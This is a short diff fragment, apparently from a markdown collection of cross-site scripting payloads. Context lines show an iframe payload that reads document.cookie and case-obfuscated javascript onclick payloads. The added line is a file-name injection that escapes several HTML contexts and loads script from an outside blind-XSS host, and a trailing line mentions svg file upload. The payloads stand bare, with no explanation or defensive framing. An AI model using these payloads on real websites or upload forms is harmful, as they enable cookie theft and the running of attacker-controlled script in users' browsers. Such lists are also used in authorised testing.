@@ -98,6 +98,8 @@ tes/><iframe src-javascript:prompt(document.cookie)>
 batman"></form><div class="inner product-tab"><h3><jAvAsCrIpT: onclick=location=tagName BinnerHTML Blocation.hash>/*click me!#*/alert(1)
 batman"></form><div%20class="inner%20product-tab"><h3><jAvAsCrIpT:%20onclick=location=tagName%20BinnerHTML%20Blocation.hash>/*click%20me!#*/alert(1)
 
+"filename":"synack'\"><title></textarea></script></style></noscript><script src=https://abc.xss.ht></script>.jpg"
+
 ```
 
 svg file upload
